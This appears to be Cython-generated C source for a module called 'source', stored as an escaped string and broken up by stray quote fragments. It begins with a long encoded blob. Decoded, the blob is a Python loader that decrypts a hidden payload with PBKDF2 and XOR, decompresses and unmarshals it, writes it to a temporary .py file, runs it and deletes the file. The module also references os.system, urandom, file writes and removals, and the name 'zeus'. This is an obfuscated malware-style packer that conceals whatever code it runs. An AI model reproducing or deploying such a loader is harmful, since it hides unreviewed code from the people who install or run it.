cmtWJGY1cGc1WkVxTjtaUEtNZW03JShaaiktYUpiVVxcIm9FNUgtaFZRYlRvOj5LNi1tTjJIZ1hsZWFdT1pVJixaamQzUzRDTkxZRzdcJ1FXSUtsWj9gOFA3OiQrVy0rbCNMXFxKUFEtXCdLQDdjVywoalExbzorWVpvIWpFOmBwJCJgKl1IJU9FajhISGVXdCI4I0A1IiI4T2woTmBfIypcJ1xcVmRTbzFmUUFbXUdwX2Q7R2hqOzZmITc6U04kUGBnQWZSOWZacDdhc21qX1VrXTwhP0QuLjt1LiRna0JjYWVBcTAlWDo6YWBUT0h1cVNCakkxZkw2PVRkKEpRV2opI0UsOnBlXCduWiIyTko/Nm5uSXNVdTFHV2tcJ01NRVUyYmlBU2xWJG5NJlVVPS1yL0hETEcoSCxcXFY6OHJFZWstOEZQVFteTU9Hb3M8YixgQlg7S2A9N1U7S0NIJkJXOGktWEMxU3FCOEU8PSo5bmNGPEUtWCRHRUw8ZkQkbFBwVllzIi11Y1xcXm5fZ3NgXzMoLGQiLmcmImY9KTZJbG9zbUUjU0VTKlUxXFxNYXFcXCoqb1laXT0raiQ7cyYzajwpMl9dViw4TV9qVTFFOlVlZlQ5ZStIS3JlL2w2ZFZcJ2ZPUmI0cnEvO15PKVojWU5tTTNiMEJJPiUsLUQ4UW1mNW1lQENPRV9kPyk4PVhoS1osPkJKMi9pVCZAcSl1Vj9MSC9JNkAqOT0sc2NGa1QqMkdcXFwnOlwnPEFiL19sYGU+TFZwTFlFM2FJMj9eInE0UjIhWUZfUGZtYVNlQUVPYlI1YG9XcCk0SGpOQjVIUkZNWGg1K28ycWFXJT01bUtKO2tpNCF1SGhkVEEoKmlLTnVaVXVPRlRcJ3FaQz9GV10yOEptS0BBImVdS0wiVlBtSmRkUz5OMD1bNjVJXFxcXDZDMVZsMEdMP1hgTDVnL2E4KHBhZzs2VHRdRlZzWFhxNVFhYjZpOE9OOGFtS2JsZl8pQTthO1k/Pk1dXjNGSlwnK1FtbyQ6bmZaQENvZDt1SlVnJmJLdSkjOTB1LGwpKlM+Z2RvbVNaVColSSNWTE9MSCFNNyYrMlwnZkJHZDhgXWRxcjUrKyZnYGtGcS1acDVZOjpgTkZwP0VHVEBSUWxEKkZRJjQrUVg1RXNmPjxTQDFiRVEsJilQZ09VXCdtSj4tW0w/U205KFohZTlpYV83TCIsNEhURmRUQyVFZjlvbDEoMFohRzJVR14sOGMwaj9JMWRCSExbTj1XYFVtVCNIYSFwU19maTBKN144OF89SmlhKyVHW0RUXzVhbHVQcFlCT21CR0RwRVI+QGdMbSZlW1g4JU1AMGQvblBUWkNsJm4rNy9NV1dkNW5PaTxZb144JDMvaDBIMTlrJkhCN2ReI25eNT0lSi05VzhcJ3FlOmtXbEpXQC5ZIS0oKDEyJldKKilKKUhDIiEtP10jJWQ2PzJATUxDODJyN1YxPXJAY2pbX3BJMVVVOGYhcUlD\\\"\\\"X2xqSWBaKDBcXGFWa29PR1BcXCw2ZClxYmYhT0AkUko6SmJSNWgoNTRJM0tQPSglQ1k0YUhOMTJPZHFTQEZwLjYlV1IjNFBCJnVWWkhxcWhcXEdpYGQ9X0M9Q3A9c0pjViowWzsrTW1SdCpaY1kvPFQ2Z0Q0JUV0YFkzUUlmLnBBImJGQUE6blc1aUtiLFkvZEhFJSEhTFdjM0ZdSlc7NiE""lIUlVX1hwakY5Pj1\"\"QOi5eLm4iPkddKC1CR0g8YjZCTl9sUW0yXjI4LTYpL1BhITkjU2wwUTp1KEtGS2U/cEVZM2tdNWwlXSxjcFdrL1A0UGE5MyxdWGtqblRbaC01JGZRcyxpLEQmT1leOVhcXD9hLiszNWY7ZnJiJD0lZVJcXFtddDRiJVclXCdOPDBmUkZtM15NP1ReSVJqPSMlXCdxZDFFcSxTU3JYR111Z21YSTxwPiI+XCdfKGpbSF5JMz5BKDYrZnB0aDw+PVY6QW0sSEY7S2pRa01yX0MqMz5mMkdFRUZGVi1cXDUkVUhKb2xiIzg2Q2FBKlhPVzFDTSFAZyouTUZpXCcxbEM7KDFIOm9pLWhcXDpgR2FzLmRyJFczXTMhUVNcJ3U5b2NxZFZFWD9HOSEjPCVKTW8/N0BuciwuZmNnZlF1TUJxcUNzUC9OITVkVmYvaVEsTUJUU0xEUWo5R0VUW1VnSDYibFYsTlN1JlglXFxbRUNSZHBkUzxjP3ExOCs+RjNtYnJNO1NvSnJhQmRZbSlyIjhMLUFrL04+OFVQNFhfQV1tO1otbFxcRSYmKmZCWkgtcF1Wc1g4XCdeWC5sPEApams3JGxhYTR1W0NWbT1LLlFjRDQmMVZuP1A0VEd0cXI3YmosSlhVQTJQVEFQSjdFbFJ0P1hIUW9bNC1zXTVvLVhpIiYuaWhNND9wKElbTUhnOVRlP2FfUjMkQixRcC5PQSFHKk1eZy5tMVFzIlpTTWtDaUFjTTxNTlwnNE8lITswaWJDbVJoNTFLUCpHdUxrVz5dVjItIjVAbSI3M1ovTlwnUkJsK09cXG1iOEFkOzBhW2dVa3BEVmVYYzExNzpEXFxbQ05uSXNsQ1E0UmUzRjBWVVdBY0JWSiNdKyVoWTtscD8rRkVTWyVFa0dwK0RCSiQ0ZHU0YG5VIjo3ckU9KW5WJk1FNiJUXCdeLjJoX1pialhOYUFOImRwQmdPZl8vLTEqSzFJLVM+dGt1Z3FGKFg1cmRNKS1MZi47X2twXFxwUEJVVCMqbyV0ZV1KLE9DOFtiWkFNPlJZXWNkJEwsSmxbIlpyajY1YnVtIU85ITpXREErZjtcJytRTnJXMTRuWFpMST4tbFNTM1NRQ2AvVnJuTTZjIzpaZkg+OS8oczhDO1tkWXIkajA2WTNEMDM3UmQ9S0UvPnFIWlRkZygwLVpDP1VBXkRfYiRPU2k8PG5wKzsqZ0sxXmlsW25cJ0AhbU0zS2ZlZXBBUDpxLDhbdXJaSEpgaitAKGFxSWtfO2JCNSYoXFxZODZcJzMrdCNHL3MyVTU2QHVpX0otS1tFI2heWGs7RisuIUElaDMvXFxpbEx1W1ZXM1g5KVQoRDZiPTFEM11gLlNwL1RvaEJBJl5bVG5pPjZaXjszTitJWTw9MTdWQkJLQjNBa24/Wj1bdExNKT83QU9wLk07WDlYKS9BSEtVKT8zdFpQLlwnIlhvYDVwNDcyZlBnSD47OC4sSElea2tlRlNkUCY8TFFnOUpyWkBjOFQ9NW8lOy4jSEckLW9XInRQQE4mRTdwP0tEYGBeXUNVZVM1Wj5yQjBRKyZVTHMhU1NcJ3BSY2Y5a0ErbDUldEgwLjl0ZmVHM1kvV2dkRllYKEFLcVdmSz5zRSEiTm9IYzhEamckdU1UODE2c3BKP1FBaGYxQ3FZVVtzMCpIQEMrdGVVM0VlTyVxWTJbJCJUbV1bTjpkLD05JwpiPWJhc2U2NC5hODVkZWNvZGUoYS5lbmNvZGUoKSkKc2Fs\\\"\\\"dD1iWzoxNl0KY3Q9YlsxNjpdCmtleT1fcGJrZGYyKHB3LHNhbHQsaXRzPTEwMDAwMCkKej1feG9yKGN0LGtleSkKcD16bGliLmRlY29tcHJlc3MoeikKbTEscz1tYXJzaGFsLmxvYWRzKHApCnQ9dGVtcGZpbGUuTmFtZWRUZW1wb3JhcnlGaWxlKGRlbGV0ZT1GYWxzZSx""zdWZmaXg9Ii5weSIpCnQud3J\"\"pdGUocykKdC5jbG9zZSgpCnJ1bnB5LnJ1bl9wYXRoKHQubmFtZSxydW5fbmFtZT0iX19tYWluX18iKQpvcy51bmxpbmsodC5uYW1lKQo=\\\";\\nstatic PyObject *__pyx_n_s_AM;\\nstatic PyObject *__pyx_n_s_BaseException;\\nstatic PyObject *__pyx_n_s_D;\\nstatic PyObject *__pyx_n_s_E;\\nstatic PyObject *__pyx_kp_u_aW1wb3J0IHRlbXBmaWxlLHpsaWIsbWFy;\\nstatic PyObject *__pyx_n_s_argv;\\nstatic PyObject *__pyx_n_s_ase;\\nstatic PyObject *__pyx_n_s_b64decode;\\nstatic PyObject *__pyx_n_s_base64;\\nstatic PyObject *__pyx_n_s_cline_in_traceback;\\nstatic PyObject *__pyx_n_s_enter;\\nstatic PyObject *__pyx_n_s_exists;\\nstatic PyObject *__pyx_n_s_exit;\\nstatic PyObject *__pyx_n_s_import;\\nstatic PyObject *__pyx_n_s_lambda;\\nstatic PyObject *__pyx_n_s_main;\\nstatic PyObject *__pyx_n_s_name;\\nstatic PyObject *__pyx_n_s_open;\\nstatic PyObject *__pyx_n_s_os;\\nstatic PyObject *__pyx_n_s_path;\\nstatic PyObject *__pyx_n_s_pp;\\nstatic PyObject *__pyx_n_s_print;\\nstatic PyObject *__pyx_n_s_randint;\\nstatic PyObject *__pyx_n_s_random;\\nstatic PyObject *__pyx_n_s_read;\\nstatic PyObject *__pyx_n_s_remove;\\nstatic PyObject *__pyx_n_s_rndm;\\nstatic PyObject *__pyx_n_s_seek;\\nstatic PyObject *__pyx_n_s_source;\\nstatic PyObject *__pyx_n_s_ss;\\nstatic PyObject *__pyx_n_s_sys;\\nstatic PyObject *__pyx_n_s_system;\\nstatic PyObject *__pyx_n_s_test;\\nstatic PyObject *__pyx_n_s_urandom;\\nstatic PyObject *__pyx_n_s_write;\\nstatic PyObject *__pyx_n_s_zeus;\\nstatic PyObject *__pyx_lambda_funcdef_6source_lambda(CYTHON_UNUSED PyObject *__pyx_self); /* proto */\\nstatic PyObject *__pyx_int_0;\\nstatic PyObject *__pyx_int_1;\\nstatic PyObject *__pyx_int_32;\\nstatic PyObject *__pyx_int_43;\\nstatic PyObject *__pyx_int_46;\\nstatic PyObject *__pyx_int_90;\\nstatic PyObject *__pyx_int_98;\\nstatic PyObject *__pyx_int_101;\\nstatic PyObject *__pyx_int_104;\\nstatic PyObject *__pyx_int_110;\\nstatic PyObject *__pyx_int_111;\\nstatic PyObject *__pyx_int_112;\\nstatic PyObject *__pyx_int_114"";\\nstatic PyObject *__pyx_int_115;\\nstatic PyObject *__pyx_int_116;\\nstatic PyOb\"\"ject *__pyx_int_117;\\nstatic PyObject *__pyx_int_119;\\nstatic PyObject *__pyx_int_121;\\nstatic PyObject *__pyx_int_1024;\\nstatic PyObject *__pyx_tuple_;\\nstatic PyObject *__pyx_slice__2;\\nstatic PyObject *__pyx_tuple__3;\\n/* Late includes */\\n\\n\\n\\n/* Python wrapper */\\nstatic PyObject *__pyx_pw_6source_lambda(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused); /*proto*/\\nstatic PyMethodDef __pyx_mdef_6source_lambda = {\\\"lambda\\\", (PyCFunction)__pyx_pw_6source_lambda, METH_NOARGS, 0};\\nstatic PyObject *__pyx_pw_6source_lambda(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused) {\\n  PyObject *__pyx_r = 0;\\n  __Pyx_RefNannyDeclarations\\n  __Pyx_RefNannySetupContext(\\\"lambda (wrapper)\\\", 0);\\n  __pyx_r = __pyx_lambda_funcdef_6source_lambda(__pyx_self);\\n\\n  /* function exit code */\\n  __Pyx_RefNannyFinishContext();\\n  return __pyx_r;\\n}\\n\\nstatic PyObject *__pyx_lambda_funcdef_6source_lambda(CYTHON_UNUSED PyObject *__pyx_self) {\\n  PyObject *__pyx_r = NULL;\\n  __Pyx_RefNannyDeclarations\\n  __Pyx_RefNannySetupContext(\\\"lambda\\\", 0);\\n  __Pyx_XDECREF(__pyx_r);\\n  __Pyx_INCREF(__pyx_kp_u_aW1wb3J0IHRlbXBmaWxlLHpsaWIsbWFy);\\n  __pyx_r = __pyx_kp_u_aW1wb3J0IHRlbXBmaWxlLHpsaWIsbWFy;\\n  goto __pyx_L0;\\n\\n  /* function exit code */\\n  __pyx_L0:;\\n  __Pyx_XGIVEREF(__pyx_r);\\n  __Pyx_RefNannyFinishContext();\\n  return __pyx_r;\\n}\\n\\nstatic PyMethodDef __pyx_methods[] = {\\n  {0, 0, 0, 0}\\n};\\n\\n#if PY_MAJOR_VERSION >= 3\\n#if CYTHON_PEP489_MULTI_PHASE_INIT\\nstatic PyObject* __pyx_pymod_create(PyObject *spec, PyModuleDef *def); /*proto*/\\nstatic int __pyx_pymod_exec_source(PyObject* module); /*proto*/\\nstatic PyModuleDef_Slot __pyx_moduledef_slots[] = {\\n  {Py_mod_create, (void*)__pyx_pymod_create},\\n  {Py_mod_exec, (void*)__pyx_pymod_exec_source},\\n  {0, NULL}\\n};\\n#endif\\n\\nstatic struct PyModuleDef __pyx_moduledef = {""\\n    PyModuleDef_HEAD_INIT,\\n    \\\"source\\\",\\n    0, /* m_doc */\\n  #if CYTHON_PEP489_MULTI_PHASE_INIT\\n    0, /* m_size */\\n  #else\\n    -1, /* m_size */\\n  #\"\"endif\\n    __pyx_methods /* m_methods */,\\n  #if CYTHON_PEP489_MULTI_PHASE_INIT\\n    __pyx_moduledef_slots, /* m_slots */\\n  #else\\n    NULL, /* m_reload */\\n  #endif\\n    NULL, /* m_traverse */\\n    NULL, /* m_clear */\\n    NULL /* m_free */\\n};\\n#endif\\n#ifndef CYTHON_SMALL_CODE\\n#if defined(__clang__)\\n    #define CYTHON_SMALL_CODE\\n#elif defined(__GNUC__) && (__GNUC__ > 4 || (__GNUC__ == 4 && __GNUC_MINOR__ >= 3))\\n    #define CYTHON_SMALL_CODE __attribute__((cold))\\n#else\\n    #define CYTHON_SMALL_CODE\\n#endif\\n#endif\\n\\nstatic __Pyx_StringTabEntry __pyx_string_tab[] = {\\n  {&__pyx_n_s_AM, __pyx_k_AM, sizeof(__pyx_k_AM), 0, 0, 1, 1},\\n  {&__pyx_n_s_BaseException, __pyx_k_BaseException, sizeof(__pyx_k_BaseException), 0, 0, 1, 1},\\n  {&__pyx_n_s_D, __pyx_k_D, sizeof(__pyx_k_D), 0, 0, 1, 1},\\n  {&__pyx_n_s_E, __pyx_k_E, sizeof(__pyx_k_E), 0, 0, 1, 1},\\n  {&__pyx_kp_u_aW1wb3J0IHRlbXBmaWxlLHpsaWIsbWFy, __pyx_k_aW1wb3J0IHRlbXBmaWxlLHpsaWIsbWFy, sizeof(__pyx_k_aW1wb3J0IHRlbXBmaWxlLHpsaWIsbWFy), 0, 1, 0, 0},\\n  {&__pyx_n_s_argv, __pyx_k_argv, sizeof(__pyx_k_argv), 0, 0, 1, 1},\\n  {&__pyx_n_s_ase, __pyx_k_ase, sizeof(__pyx_k_ase), 0, 0, 1, 1},\\n  {&__pyx_n_s_b64decode, __pyx_k_b64decode, sizeof(__pyx_k_b64decode), 0, 0, 1, 1},\\n  {&__pyx_n_s_base64, __pyx_k_base64, sizeof(__pyx_k_base64), 0, 0, 1, 1},\\n  {&__pyx_n_s_cline_in_traceback, __pyx_k_cline_in_traceback, sizeof(__pyx_k_cline_in_traceback), 0, 0, 1, 1},\\n  {&__pyx_n_s_enter, __pyx_k_enter, sizeof(__pyx_k_enter), 0, 0, 1, 1},\\n  {&__pyx_n_s_exists, __pyx_k_exists, sizeof(__pyx_k_exists), 0, 0, 1, 1},\\n  {&__pyx_n_s_exit, __pyx_k_exit, sizeof(__pyx_k_exit), 0, 0, 1, 1},\\n  {&__pyx_n_s_import, __pyx_k_import, sizeof(__pyx_k_import), 0, 0, 1, 1},\\n  {&__pyx_n_s_lambda, __pyx_k_lambda, sizeof(__pyx_k_lambda)"", 0, 0, 1, 1},\\n  {&__pyx_n_s_main, __pyx_k_main, sizeof(__pyx_k_main), 0, 0, 1, 1},\\n  {&__pyx_n_s_name, __pyx_k_name, sizeof(__pyx_k_name), 0, 0, 1, 1},\\n  {&__pyx_n_s_open, __pyx_k_open, sizeof(__pyx_k_open), 0\"\", 0, 1, 1},\\n  {&__pyx_n_s_os, __pyx_k_os, sizeof(__pyx_k_os), 0, 0, 1, 1},\\n  {&__pyx_n_s_path, __pyx_k_path, sizeof(__pyx_k_path), 0, 0, 1, 1},\\n  {&__pyx_n_s_pp, __pyx_k_pp, sizeof(__pyx_k_pp), 0, 0, 1, 1},\\n  {&__pyx_n_s_print, __pyx_k_print, sizeof(__pyx_k_print), 0, 0, 1, 1},\\n  {&__pyx_n_s_randint, __pyx_k_randint, sizeof(__pyx_k_randint), 0, 0, 1, 1},\\n  {&__pyx_n_s_random, __pyx_k_random, sizeof(__pyx_k_random), 0, 0, 1, 1},\\n  {&__pyx_n_s_read, __pyx_k_read, sizeof(__pyx_k_read), 0, 0, 1, 1},\\n  {&__pyx_n_s_remove, __pyx_k_remove, sizeof(__pyx_k_remove), 0, 0, 1, 1},\\n  {&__pyx_n_s_rndm, __pyx_k_rndm, sizeof(__pyx_k_rndm), 0, 0, 1, 1},\\n  {&__pyx_n_s_seek, __pyx_k_seek, sizeof(__pyx_k_seek), 0, 0, 1, 1},\\n  {&__pyx_n_s_source, __pyx_k_source, sizeof(__pyx_k_source), 0, 0, 1, 1},\\n  {&__pyx_n_s_ss, __pyx_k_ss, sizeof(__pyx_k_ss), 0, 0, 1, 1},\\n  {&__pyx_n_s_sys, __pyx_k_sys, sizeof(__pyx_k_sys), 0, 0, 1, 1},\\n  {&__pyx_n_s_system, __pyx_k_system, sizeof(__pyx_k_system), 0, 0, 1, 1},\\n  {&__pyx_n_s_test, __pyx_k_test, sizeof(__pyx_k_test), 0, 0, 1, 1},\\n  {&__pyx_n_s_urandom, __pyx_k_urandom, sizeof(__pyx_k_urandom), 0, 0, 1, 1},\\n  {&__pyx_n_s_write, __pyx_k_write, sizeof(__pyx_k_write), 0, 0, 1, 1},\\n  {&__pyx_n_s_zeus, __pyx_k_zeus, sizeof(__pyx_k_zeus), 0, 0, 1, 1},\\n  {0, 0, 0, 0, 0, 0, 0}\\n};\\nstatic CYTHON_SMALL_CODE int __Pyx_InitCachedBuiltins(void) {\\n  __pyx_builtin_open = __Pyx_GetBuiltinName(__pyx_n_s_open); if (!__pyx_builtin_open) __PYX_ERR(0, 11, __pyx_L1_error)\\n  __pyx_builtin_print = __Pyx_GetBuiltinName(__pyx_n_s_print); if (!__pyx_builtin_print) __PYX_ERR(0, 23, __pyx_L1_error)\\n  __pyx_builtin_BaseException = __Pyx_GetBuiltinName(__pyx_n_s_BaseException); if (!__pyx_builtin_BaseException) __PYX_ER""R(0, 28, __pyx_L1_error)\\n  return 0;\\n  __pyx_L1_error:;\\n  return -1;\\n}\\n\\nstatic CYTHON_SMALL_CODE int __Pyx_InitCachedConstants(void) {\\n  __Pyx_RefNannyDeclarations\\n  __Pyx_RefNannySetupContext(\\\"__Pyx_InitCachedConstants\\\", 0);\\n\\n\\n  _\"\"_pyx_tuple_ = PyTuple_Pack(3, Py_None, Py_None, Py_None); if (unlikely(!__pyx_tuple_)) __PYX_ERR(0, 11, __pyx_L1_error)\\n  __Pyx_GOTREF(__pyx_tuple_);\\n  __Pyx_GIVEREF(__pyx_tuple_);\\n\\n\\n  __pyx_slice__2 = PySlice_New(__pyx_int_1, Py_None, Py_None); if (unlikely(!__pyx_slice__2)) __PYX_ERR(0, 13, __pyx_L1_error)\\n  __Pyx_GOTREF(__pyx_slice__2);\\n  __Pyx_GIVEREF(__pyx_slice__2);\\n\\n\\n  __pyx_tuple__3 = PyTuple_Pack(1, __pyx_int_1024); if (unlikely(!__pyx_tuple__3)) __PYX_ERR(0, 19, __pyx_L1_error)\\n  __Pyx_GOTREF(__pyx_tuple__3);\\n  __Pyx_GIVEREF(__pyx_tuple__3);\\n  __Pyx_RefNannyFinishContext();\\n  return 0;\\n  __pyx_L1_error:;\\n  __Pyx_RefNannyFinishContext();\\n  return -1;\\n}\\n\\nstatic CYTHON_SMALL_CODE int __Pyx_InitGlobals(void) {\\n  if (__Pyx_InitStrings(__pyx_string_tab) < 0) __PYX_ERR(0, 4, __pyx_L1_error)\\n  __pyx_int_0 = PyInt_FromLong(0); if (unlikely(!__pyx_int_0)) __PYX_ERR(0, 4, __pyx_L1_error)\\n  __pyx_int_1 = PyInt_FromLong(1); if (unlikely(!__pyx_int_1)) __PYX_ERR(0, 4, __pyx_L1_error)\\n  __pyx_int_32 = PyInt_FromLong(32); if (unlikely(!__pyx_int_32)) __PYX_ERR(0, 4, __pyx_L1_error)\\n  __pyx_int_43 = PyInt_FromLong(43); if (unlikely(!__pyx_int_43)) __PYX_ERR(0, 4, __pyx_L1_error)\\n  __pyx_int_46 = PyInt_FromLong(46); if (unlikely(!__pyx_int_46)) __PYX_ERR(0, 4, __pyx_L1_error)\\n  __pyx_int_90 = PyInt_FromLong(90); if (unlikely(!__pyx_int_90)) __PYX_ERR(0, 4, __pyx_L1_error)\\n  __pyx_int_98 = PyInt_FromLong(98); if (unlikely(!__pyx_int_98)) __PYX_ERR(0, 4, __pyx_L1_error)\\n  __pyx_int_101 = PyInt_FromLong(101); if (unlikely(!__pyx_int_101)) __PYX_ERR(0, 4, __pyx_L1_error)\\n  __pyx_int_104 = PyInt_FromLong(104); if (unlikely(!__pyx_int_104)) __PYX_ERR(0, 4, __pyx_""L1_error)\\n  __pyx_int_110 = PyInt_FromLong(110); if (unlikely(!__pyx_int_110)) __PYX_ERR(0, 4, __pyx_L1_error)\\n  __pyx_int_111 = PyInt_FromLong(111); if (unlikely(!__pyx_int_111)) __PYX_ERR(0, 4, __pyx_L1_error)\\n  __pyx_int_112 = PyInt_FromLong(112); if (unlikely(!__pyx_int_112)) __PYX_ERR\"\"(0, 4, __pyx_L1_error)\\n  __pyx_int_114 = PyInt_FromLong(114); if (unlikely(!__pyx_int_114)) __PYX_ERR(0, 4, __pyx_L1_error)\\n  __pyx_int_115 = PyInt_FromLong(115); if (unlikely(!__pyx_int_115)) __PYX_ERR(0, 4, __pyx_L1_error)\\n  __pyx_int_116 = PyInt_FromLong(116); if (unlikely(!__pyx_int_116)) __PYX_ERR(0, 4, __pyx_L1_error)\\n  __pyx_int_117 = PyInt_FromLong(117); if (unlikely(!__pyx_int_117)) __PYX_ERR(0, 4, __pyx_L1_error)\\n  __pyx_int_119 = PyInt_FromLong(119); if (unlikely(!__pyx_int_119)) __PYX_ERR(0, 4, __pyx_L1_error)\\n  __pyx_int_121 = PyInt_FromLong(121); if (unlikely(!__pyx_int_121)) __PYX_ERR(0, 4, __pyx_L1_error)\\n  __pyx_int_1024 = PyInt_FromLong(1024); if (unlikely(!__pyx_int_1024)) __PYX_ERR(0, 4, __pyx_L1_error)\\n  return 0;\\n  __pyx_L1_error:;\\n  return -1;\\n}\\n\\nstatic CYTHON_SMALL_CODE int __Pyx_modinit_global_init_code(void); /*proto*/\\nstatic CYTHON_SMALL_CODE int __Pyx_modinit_variable_export_code(void); /*proto*/\\nstatic CYTHON_SMALL_CODE int __Pyx_modinit_function_export_code(void); /*proto*/\\nstatic CYTHON_SMALL_CODE int __Pyx_modinit_type_init_code(void); /*proto*/\\nstatic CYTHON_SMALL_CODE int __Pyx_modinit_type_import_code(void); /*proto*/\\nstatic CYTHON_SMALL_CODE int __Pyx_modinit_variable_import_code(void); /*proto*/\\nstatic CYTHON_SMALL_CODE int __Pyx_modinit_function_import_code(void); /*proto*/\\n\\nstatic int __Pyx_modinit_global_init_code(void) {\\n  __Pyx_RefNannyDeclarations\\n  __Pyx_RefNannySetupContext(\\\"__Pyx_modinit_global_init_code\\\", 0);\\n  /*--- Global init code ---*/\\n  __Pyx_RefNannyFinishContext();\\n  return 0;\\n}\\n\\nstatic int __Pyx_modinit_variable_export_code(void) {\\n  __Pyx_RefNannyDecla""rations\\n  __Pyx_RefNannySetupContext(\\\"__Pyx_modinit_variable_export_code\\\", 0);\\n  /*--- Variable export code ---*/\\n  __Pyx_RefNannyFinishContext();\\n  return 0;\\n}\\n\\nstatic int __Pyx_modinit_function_export_code(void) {\\n  __Pyx_RefNannyDeclarations\\n  __Pyx_RefNannySetupContext(\\\"__Pyx_modinit_function_export_code\\\", 0);\\n  /*\"\"--- Function export code ---*/\\n  __Pyx_RefNannyFinishContext();\\n  return 0;\\n}\\n\\nstatic int __Pyx_modinit_type_init_code(void) {\\n  __Pyx_RefNannyDeclarations\\n  __Pyx_RefNannySetupContext(\\\"__Pyx_modinit_type_init_code\\\", 0);\\n  /*--- Type init code ---*/\\n  __Pyx_RefNannyFinishContext();\\n  return 0;\\n}\\n\\nstatic int __Pyx_modinit_type_import_code(void) {\\n  __Pyx_RefNannyDeclarations\\n  __Pyx_RefNannySetupContext(\\\"__Pyx_modinit_type_import_code\\\", 0);\\n  /*--- Type import code ---*/\\n  __Pyx_RefNannyFinishContext();\\n  return 0;\\n}\\n\\nstatic int __Pyx_modinit_variable_import_code(void) {\\n  __Pyx_RefNannyDeclarations\\n  __Pyx_RefNannySetupContext(\\\"__Pyx_modinit_variable_import_code\\\", 0);\\n  /*--- Variable import code ---*/\\n  __Pyx_RefNannyFinishContext();\\n  return 0;\\n}\\n\\nstatic int __Pyx_modinit_function_import_code(void) {\\n  __Pyx_RefNannyDeclarations\\n  __Pyx_RefNannySetupContext(\\\"__Pyx_modinit_function_import_code\\\", 0);\\n  /*--- Function import code ---*/\\n  __Pyx_RefNannyFinishContext();\\n  return 0;\\n}\\n\\n\\n#ifndef CYTHON_NO_PYINIT_EXPORT\\n#define __Pyx_PyMODINIT_FUNC PyMODINIT_FUNC\\n#elif PY_MAJOR_VERSION < 3\\n#ifdef __cplusplus\\n#define __Pyx_PyMODINIT_FUNC extern \\\"C\\\" void\\n#else\\n#define __Pyx_PyMODINIT_FUNC void\\n#endif\\n#else\\n#ifdef __cplusplus\\n#define __Pyx_PyMODINIT_FUNC extern \\\"C\\\" PyObject *\\n#else\\n#define __Pyx_PyMODINIT_FUNC PyObject *\\n#endif\\n#endif\\n\\n\\n#if PY_MAJOR_VERSION < 3\\n__Pyx_PyMODINIT_FUNC initsource(void) CYTHON_SMALL_CODE; /*proto*/\\n__Pyx_PyMODINIT_FUNC initsource(void)\\n#else\\n__Py""x_PyMODINIT_FUNC PyInit_source(void) CYTHON_SMALL_CODE; /*proto*/\\n__Pyx_PyMODINIT_FUNC PyInit_source(void)\\n#if CYTHON_PEP489_MULTI_PHASE_INIT\\n{\\n  return PyModuleDef_Init(&__pyx_moduledef);\\n}\\nstatic CYTHON_SMALL_CODE int __Pyx_check_single_interpreter(void) {\\n    #if PY_VERSION_HEX >= 0x030700A1\\n    static PY_INT64_T main_interpreter_id = -1;\\n    PY_INT64_T current_id = PyInterpreterState_GetID(PyThreadState_Get()->interp);\"\"\\n    if (main_interpreter_id == -1) {\\n        main_interpreter_id = current_id;\\n        return (unlikely(current_id == -1)) ? -1 : 0;\\n    } else if (unlikely(main_interpreter_id != current_id))\\n    #else\\n    static PyInterpreterState *main_interpreter = NULL;\\n    PyInterpreterState *current_interpreter = PyThreadState_Get()->interp;\\n    if (!main_interpreter) {\\n        main_interpreter = current_interpreter;\\n    } else if (unlikely(main_interpreter != current_interpreter))\\n    #endif\\n    {\\n        PyErr_SetString(\\n            PyExc_ImportError,\\n            \\\"Interpreter change detected - this module can only be loaded into one interpreter per process.\\\");\\n        return -1;\\n    }\\n    return 0;\\n}\\nstatic CYTHON_SMALL_CODE int __Pyx_copy_spec_to_module(PyObject *spec, PyObject *moddict, const char* from_name, const char* to_name, int allow_none) {\\n    PyObject *value = PyObject_GetAttrString(spec, from_name);\\n    int result = 0;\\n    if (likely(value)) {\\n        if (allow_none || value != Py_None) {\\n            result = PyDict_SetItemString(moddict, to_name, value);\\n        }\\n        Py_DECREF(value);\\n    } else if (PyErr_ExceptionMatches(PyExc_AttributeError)) {\\n        PyErr_Clear();\\n    } else {\\n        result = -1;\\n    }\\n    return result;\\n}\\nstatic CYTHON_SMALL_CODE PyObject* __pyx_pymod_create(PyObject *spec, CYTHON_UNUSED PyModuleDef *def) {\\n    PyObject *module = NULL, *moddict, *modname;\\n    if (__Pyx_check_single_interpreter())\\n        return ""NULL;\\n    if (__pyx_m)\\n        return __Pyx_NewRef(__pyx_m);\\n    modname = PyObject_GetAttrString(spec, \\\"name\\\");\\n    if (unlikely(!modname)) goto bad;\\n    module = PyModule_NewObject(modname);\\n    Py_DECREF(modname);\\n    if (unlikely(!module)) goto bad;\\n    moddict = PyModule_GetDict(module);\\n    if (unlikely(!moddict)) goto bad;\\n    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, \\\"loader\\\", \\\"__loader__\\\", 1) < 0)) goto bad;\\n    if (unlikely(__Pyx_copy_spec_to_modu\"\"le(spec, moddict, \\\"origin\\\", \\\"__file__\\\", 1) < 0)) goto bad;\\n    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, \\\"parent\\\", \\\"__package__\\\", 1) < 0)) goto bad;\\n    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, \\\"submodule_search_locations\\\", \\\"__path__\\\", 0) < 0)) goto bad;\\n    return module;\\nbad:\\n    Py_XDECREF(module);\\n    return NULL;\\n}\\n\\n\\nstatic CYTHON_SMALL_CODE int __pyx_pymod_exec_source(PyObject *__pyx_pyinit_module)\\n#endif\\n#endif\\n{\\n  PyObject *__pyx_t_1 = NULL;\\n  PyObject *__pyx_t_2 = NULL;\\n  PyObject *__pyx_t_3 = NULL;\\n  PyObject *__pyx_t_4 = NULL;\\n  PyObject *__pyx_t_5 = NULL;\\n  PyObject *__pyx_t_6 = NULL;\\n  PyObject *__pyx_t_7 = NULL;\\n  PyObject *__pyx_t_8 = NULL;\\n  PyObject *__pyx_t_9 = NULL;\\n  PyObject *__pyx_t_10 = NULL;\\n  PyObject *__pyx_t_11 = NULL;\\n  PyObject *__pyx_t_12 = NULL;\\n  int __pyx_t_13;\\n  int __pyx_t_14;\\n  PyObject *__pyx_t_15 = NULL;\\n  Py_ssize_t __pyx_t_16;\\n  int __pyx_t_17;\\n  int __pyx_t_18;\\n  char const *__pyx_t_19;\\n  PyObject *__pyx_t_20 = NULL;\\n  char const *__pyx_t_21;\\n  int __pyx_t_22;\\n  int __pyx_lineno = 0;\\n  const char *__pyx_filename = NULL;\\n  int __pyx_clineno = 0;\\n  